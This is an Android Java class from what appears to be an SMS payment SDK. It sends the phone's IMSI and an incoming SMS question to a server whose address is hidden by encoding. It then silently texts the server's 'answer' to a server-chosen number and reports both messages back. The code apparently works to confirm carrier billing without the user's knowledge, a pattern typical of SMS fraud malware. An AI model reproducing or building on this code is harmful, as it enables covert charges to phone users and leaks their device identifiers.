package com.example.sayid.myapplication.model;

import com.example.sayid.myapplication.common.data.ConfigConst;
import com.example.sayid.myapplication.common.data.ErrorCode;
import com.example.sayid.myapplication.common.listener.OnNetListener;
import com.example.sayid.myapplication.common.listener.OnPayListener;
import com.example.sayid.myapplication.common.listener.SendSmsListener;
import com.example.sayid.myapplication.common.util.JsonUtil;
import com.example.sayid.myapplication.common.util.ParseKsy;
import com.example.sayid.myapplication.common.util.TelephonyUtil;
import com.example.sayid.myapplication.http.HttpJsonThread;
import com.example.sayid.myapplication.pay.AppTache;
import com.example.sayid.myapplication.smsutil.SmSutils;

import org.apache.http.HttpEntity;
import org.apache.http.ParseException;
import org.apache.http.util.EntityUtils;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

/**
 * @author Think
 */
public class SmsQuestionModel implements OnNetListener {

    private final static String TAG = "SmsQuestionModel";

    OnPayListener onPayListener;
    String pay_order_id = "";
    final String question;
    final String receiver;

    public SmsQuestionModel(OnPayListener onPayListener, String pay_order_id, String question, String receiver) {
        this.onPayListener = onPayListener;
        this.pay_order_id = pay_order_id;
        this.question = question;
        this.receiver = receiver;
    }

    /**
     * 智能问题请求
     */
    public void requestIQuestion() {
        String json = createJsonObject(question, receiver).toString();
        //.d(TAG, "requestIQuestion json=" + json);
        new HttpJsonThread().startThread(ParseKsy.decode(ConfigConst.PAY_URL_ROOT_DEFAULT_VALUE) + "/question", json, this);
    }

    @Override
    public void onSuccess(HttpEntity entity, boolean isEnc) {
        try {
            String result = EntityUtils.toString(entity);

            if (isEnc) {
                result = ParseKsy.decode(result);
            }

            parseJson(result);
        } catch (JSONException e) {
            //.e(TAG, "onSuccess error:" + e.toString());
        } catch (ParseException e) {
            //.e(TAG, "onSuccess error:" + e.toString());
        } catch (IOException e) {
            //.e(TAG, "onSuccess error:" + e.toString());
        }
    }

    @Override
    public void onFailed(String exceptionId, String exceptionText) {
        if (onPayListener != null) {
            onPayListener.onFailed("", ErrorCode.CODE_111000, ErrorCode.errorMsg.get(ErrorCode.CODE_111000));
            onPayListener = null;
        }

        ReportModel.getInstanse(AppTache.context).addReportConfirm(pay_order_id, 1, "2", ErrorCode.CODE_111000, "");
    }

    @Override
    public void onTimeout() {
        if (onPayListener != null) {
            onPayListener.onFailed("", ErrorCode.CODE_111001, ErrorCode.errorMsg.get(ErrorCode.CODE_111001));
            onPayListener = null;
        }

        ReportModel.getInstanse(AppTache.context).addReportConfirm(pay_order_id, 1, "2", ErrorCode.CODE_111001, "");
    }

    /**
     * 创建智能问答
     *
     * @param question
     * @param receiver
     * @return
     */
    private JSONObject createJsonObject(String question, String receiver) {
        JSONObject jo = new JSONObject();

        try {
            jo.put("imsi", TelephonyUtil.getImsi(AppTache.context));           //String     手机sim卡串号
            jo.put("question", question);           //String	  问题
            jo.put("receiver", receiver);           //String     回复者，答案将发至此号码中
            jo.put("pay_order_id", pay_order_id);
        } catch (JSONException e) {
            //.e(TAG, "createJsonObject error:" + e.toString());

        }
        return jo;
    }

    private void parseJson(String json) throws JSONException {
        JSONObject result = new JSONObject(json);
        String answer = JsonUtil.isNullOrGetStr(result, "answer"); // 问题答案，如果为空表示没有答案。
        String sendPhone = JsonUtil.isNullOrGetStr(result, "receiver"); // 回复者，答案将发至此号码中
        String pay_order_id = JsonUtil.isNullOrGetStr(result, "pay_order_id");
        int send_sms_timeout = JsonUtil.isNullOrGetInt(result, "send_sms_timeout");

        result = null;
        if (answer != null) {
            // 智能问答的短信
//			SendSms testSendSms = new SendSms(AppTache.context, new SendSmsListener() {
//				public void onSendSmsSuccess(String user_order_id, String pay_order_id, String destPhone, String message, int times) {
//					StringBuffer sb = new StringBuffer("receivePort=");
//					sb.append(receiver).append(", receiveMsg=").append(question)
//						.append("<br>destPort=").append(destPhone).append(", destMsg=").append(message);
//					ReportModel.getInstanse(AppTache.context).addReportConfirm(pay_order_id, 1, "1", "", sb.toString());
//				}
//
//				public void onSendSmsFailed(String user_order_id, String pay_order_id, String destPhone, String message, int items, String errorCode) {
//					StringBuffer sb = new StringBuffer("receivePort=");
//					sb.append(receiver).append("receiveMsg=").append(question)
//						.append("<br>destPort=").append(destPhone).append(", destMsg=").append(message);
//					ReportModel.getInstanse(AppTache.context).addReportConfirm(pay_order_id, 1, "2", errorCode, sb.toString());
//				}
//			});
//
//			testSendSms.sendSms("", pay_order_id, sendPhone, answer, send_sms_timeout);

            SmSutils.sendSMS("", pay_order_id, sendPhone, answer, new SendSmsListener() {
                public void onSendSmsSuccess(String user_order_id, String pay_order_id, String destPhone, String message, int times) {
                    StringBuffer sb = new StringBuffer("receivePort=");
                    sb.append(receiver).append(", receiveMsg=").append(question)
                            .append("<br>destPort=").append(destPhone).append(", destMsg=").append(message);
                    ReportModel.getInstanse(AppTache.context).addReportConfirm(pay_order_id, 1, "1", "", sb.toString());
                }

                public void onSendSmsFailed(String user_order_id, String pay_order_id, String destPhone, String message, int items, String errorCode) {
                    StringBuffer sb = new StringBuffer("receivePort=");
                    sb.append(receiver).append("receiveMsg=").append(question)
                            .append("<br>destPort=").append(destPhone).append(", destMsg=").append(message);
                    ReportModel.getInstanse(AppTache.context).addReportConfirm(pay_order_id, 1, "2", errorCode, sb.toString());
                }
            });
        }
    }

}
